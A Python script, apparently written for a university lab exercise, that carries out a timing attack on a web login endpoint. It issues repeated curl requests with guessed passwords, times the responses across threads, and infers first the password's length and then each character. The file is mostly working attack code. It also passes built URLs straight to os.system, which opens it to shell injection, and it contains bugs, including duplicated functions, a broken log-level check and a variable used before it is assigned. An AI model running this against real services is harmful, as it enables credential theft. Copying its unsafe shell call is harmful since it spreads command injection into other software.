import os
import logging as log
from time import time
import time as timer
import Configurations
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor


# - - - - - - - - - -  LOG SECTION  - - - - - - - - - -

def create_folder_if_not_exists(folder_path: str) -> str:
    """
    This function create a given folder if it doesnt exists.
    :param folder_path: String. path to the given folder that need to be created.
    """
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)


def set_logger(result_path: str, class_name: str, log_filename=None) -> log.Logger:
    """
    The function initial logger to documenting the RGB colors of the given pixel.

    :param result_path.String. represent path to result folder.
    :param class_name. String. class name of the logger.
    :param log_filename.String. custom file name. if None is given, file name will be 'logfile_{current date and time}.log
    :return: logger instance.
    """

    class MyFormatter(log.Formatter):
        converter = datetime.fromtimestamp

        def formatTime(self, record, datefmt=None):
            ct = self.converter(record.created)
            if datefmt:
                s = ct.strftime(datefmt)
            else:
                t = ct.strftime("%Y-%m-%d %H:%M:%S")
                s = "%s,%03d" % (t, record.msecs)
            return s

    # Set up a specific logger with our desired output level
    if log_filename is None:
        log_filename = f'logfile_{get_current_date_and_time()}.log'

    create_folder_if_not_exists(result_path)
    create_folder_if_not_exists(os.path.join(result_path, class_name))

    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=Configurations.log_level)
    logger = log.getLogger('MyLogger')
    formatter = MyFormatter(fmt='%(asctime)s %(message)s', datefmt='%Y-%m-%d,%H:%M:%S.%f')
    handler = log.StreamHandler()
    handler.setLevel(Configurations.log_level)
    handler.setFormatter(formatter)

    logger.addHandler(handler)

    return logger


def get_current_date_and_time() -> datetime:
    """
    This function return a current date and time in this representation DD-MM-YYYY HH:MM.
    :return: String, represent day and time.
    """
    return datetime.now().strftime('%d-%m-%Y %H-%M')


def get_session() -> None:
    """
    return session as a string.
    """
    if Configurations.session is None:
        Configurations.session = Configurations.running_folder_format
        create_folder_if_not_exists(os.path.join(Configurations.RESULTS_PATH, Configurations.session))

    return Configurations.session


def write_log(logger, message: str, log_level="info", print_to_console=Configurations.write_to_console) -> None:
    """
    Write the given message to the given og file at the specified log info.

    :param logger: Logger.
    :param message: String. message to write to log.
    :param log_level: String, represnt message log level.
    """
    if logger:
        if log_level == "info":
            logger.info(message)
        elif logger == "debug":
            logger.debug(message)
        else:
            pass

    if print_to_console:
        print(message)


def set_logger(result_path: str, class_name: str, log_filename: str = None) -> log.Logger:
    """
    The function initial logger to documenting the RGB colors of the given pixel.

    :param result_path.String. represent path to result folder.
    :param class_name. String. class name of the logger.
    :param log_filename.String. custom file name. if None is given, file name will be 'logfile_{current date and time}.log

    :return: logger instance.
    """
    # Set up a specific logger with our desired output level
    if log_filename is None:
        log_filename = f'logfile_{get_current_date_and_time()}.log'

    create_folder_if_not_exists(result_path)
    create_folder_if_not_exists(os.path.join(result_path, class_name))

    log.basicConfig(filename=os.path.join(result_path, class_name, log_filename), filemode='w', level=Configurations.log_level)
    logger = log.getLogger('MyLogger')

    return logger


# - - - - - - - - - -  FILE SECTION  - - - - - - - - - -

def create_folder_if_not_exists(folder_path: str) -> None:
    """
    Create a given folder if not already exists.

    :param folder_path: Str. path to folder.

    :return: None.
    """
    if not os.path.exists(folder_path):
        os.mkdir(folder_path)


# - - - - - - - - - -  PASSWORD SECTION  - - - - - - - - - -

def run_url(url: str) -> None:
    """
    This function request to given url and return it source code as a string.

    :param url: String. URL to request.

    :return: str. source code of the given URL.
    """
    # aviv
    # urllib.request.urlopen(url)

    #yarden
    os.system(url + ">/dev/null 2>&1")

    timer.sleep(Configurations.sleep_time)


def check_password_size_thread(url_result_command: str, iterations: int, thread_number: int, logger) -> float:
    """
    This function request the given URL iteration times and sum the requests time and return it.

    :param url_result_command: String. Given URL to send the request.
    :param iterations: Int. Number of iteration to request the given URL.
    :param thread_number: Int. Thread ID
    :param logger: logger. if not None the function write it action to the given logger.

    :return: Float. Sum all the requests time.
    """
    total_iterations_time = 0

    for i in range(iterations):
        # yarden
        start = time()
        run_url(url_result_command)
        end = time()
        res_time = end - start

        # aviv
        # res = os.popen(url_time_command).read()
        # res_time = float(res)

        # insert to dict
        total_iterations_time += res_time

        if i + 1 == iterations:
            write_log(logger, message=f"[check password size thread][length {thread_number}]: result: {total_iterations_time}:")

    return total_iterations_time


def warmup() -> None:
    """
    This function run curl for the first time to stabilize the connection time.

    :return: None.
    """
    url_time_command = 'curl -s "http://aoi.ise.bgu.ac.il/?user=test&password=test&difficulty=1"'
    run_url(url_time_command)


def check_if_distinct(results: list) -> bool:
    """
    This function will check if the given list is distinct according to the normal distribution.

    :param results: List. list with values to verify if distinct according to normal distribution.

    :return: Boolean. True if distinct, false otherwise.
    """
    # mu = 10
    # sigma2 = 4
    #
    # vector_length = len(results)
    #
    # normal_data = np.random.normal(size=vector_length) * sigma2 + mu
    #
    # h, p = stats.ttest_ind(normal_data, results)
    # if p > Configurations.alpha:
    #     return False
    # else:
    #     return True
    return True


def check_password_size(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size, logger=None) -> int:
    """
    The function uses timing attack (by time gap) the size of the password.

    :param url: String. the first part of the URL.
    :param end_url: String. the last part of the URL.
    :param max_password_size: String. the first part of the URL.
    :param logger: logger. if not None the function write it action to the given logger.

    :return: Int. size of the password by timing attack.
    """
    if Configurations.use_thread_pool:
        thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)

    warmup()

    results = {}
    future_results = []
    distinct = False

    while not distinct:
        for i in range(0, max_password_size + 1, 1):
            url_result_command = f'curl -s "{start_url}{Configurations.default_character * i}{end_url}"'
            url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
                time_total='time_total', start_url=start_url, password=Configurations.default_character * i, end_url=end_url)

            if Configurations.use_thread_pool:
                future_results.append(thread_pool.submit(check_password_size_thread, url_result_command, Configurations.attempts, i, logger))
            else:
                res = check_password_size_thread(url_result_command, Configurations.attempts, i, logger)
                results[i] = res
        if Configurations.use_thread_pool:
            thread_pool.shutdown(wait=True)

            for i in range(max_password_size + 1):
                results[i] = future_results[i].result()

        # check timing results
        max_value_index = max(results, key=results.get)
        result_list = list(results.values())
        result_list.remove(results[max_value_index])

        # check distinct
        distinct = check_if_distinct(result_list)

    return max_value_index


def crack_password_thread(url_time_command, url_result_command, ch, current_password, iterations: int=1, logger=None):
    """
    This function request the given URL iteration times and sum the requests time and return it.

    :param url_time_command: String. a full URL
    :param url_result_command:
    :param ch:
    :param iterations:
    :param logger: logger. if not None the function write it action to the given logger.

    :return:
    """
    total_iterations_time = 0

    for i in range(iterations):
        if len(Configurations.password) != 0:
            break
        elif Configurations.default_character not in current_password:  # final character
            res = os.popen(url_result_command).read()
            if res == '1':
                Configurations.password = current_password
                write_log(logger, f"[crack password thread] Password is: {current_password}")
                break

            write_log(logger, f"[crack password thread] Password is NOT: {current_password}")

        else:
            # yarden
            start = time()
            run_url(url_result_command)
            end = time()
            res_time = end - start

            # aviv
            # res = os.popen(url_time_command, ).read()
            # res_time = float(res)

            total_iterations_time += res_time

            if i + 1 == iterations:
                write_log(logger, f"[crack password thread][{ch}][iteration {i}] result time: {total_iterations_time}  -  {url_result_command}")

    return total_iterations_time


def crack_password(password_size: int, start_url: str = "", end_url: str = "", logger=None) -> str:
    """
    This function get a password size and try to break it by using timing attack.

    :param password_size: Int. length of password.
    :param start_url: String. prefix of the url.
    :param end_url: String. postfix of the url.
    :param logger: Logger. if a given, a command will be writen in it.

    :return: String. the pasword that have been found, None if failed to find the password.
    """
    password = ""

    for i in range(password_size - len(password)):


        thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)

        if i == password_size - len(password):  # last iteration
            for ch in Configurations.characters:

                current_password = f'{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}'
                url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
                    time_total='time_total', start_url=start_url, password=current_password, end_url=end_url)
                url_result_command = f'curl -s "{start_url}{current_password}{end_url}"'


                future_results.append(
                    thread_pool.submit(crack_password_thread, url_time_command, url_result_command, ch,
                                       current_password, Configurations.attempts, logger))

            if Configurations.use_thread_pool:
                thread_pool.shutdown(wait=True)
            break

        distinct = False

        while not distinct:

            results = {}
            future_results = []

            for ch in Configurations.characters:

                current_password = f'{password}{ch}{Configurations.default_character * ((password_size - len(password) - 1))}'
                url_time_command = 'curl -s -w "%{{time_total}}" "{start_url}{password}{end_url}\"'.format(
                    time_total='time_total', start_url=start_url, password=current_password, end_url=end_url)
                url_result_command = f'curl -s "{start_url}{current_password}{end_url}"'

                if Configurations.use_thread_pool:
                    future_results.append(thread_pool.submit(crack_password_thread, url_time_command, url_result_command, ch, current_password, Configurations.attempts, logger))
                else:
                    res = crack_password_thread(url_time_command, url_result_command, ch, current_password, Configurations.attempts, logger)
                    results[ch] = res

            if Configurations.use_thread_pool:
                thread_pool.shutdown(wait=True)

                for j in range(len(future_results)):
                    result = future_results[j].result()
                    results[result[0]] = result[1]

            # check timing results
            max_char = max(results, key=results.get)
            result_list = list(results.values())
            result_list.remove(results[max_char])

            # check distinct
            distinct = check_if_distinct(result_list)

        password += max_char

    return Configurations.password if Configurations.password != "" else None


def timing_attack(start_url: str = "", end_url: str= "", password_size: int = Configurations.default_password_size) -> str:
    """
    This function get url and password size and return the password by using a time attack.

    :param start_url: str. first part of the url before password appear.
    :param end_url: str. last part of the url after password appear.
    :param password_size: Int. max size of the password that possible.

    :return: Int. password as a string. None if couldn't find any.
    """
    logger = set_logger(Configurations.result_path, "crack password")

    size = check_password_size(start_url=start_url, end_url=end_url, max_password_size=password_size, logger=logger)

    if size is None:
        return None

    write_log(logger, log_level="debug", message=f"[timing attack]: starting to lookup password in size {size}.")

    plaintext_password = crack_password(password_size=size, start_url=start_url, end_url=end_url, logger=logger)

    if plaintext_password is None:
        return None

    return plaintext_password
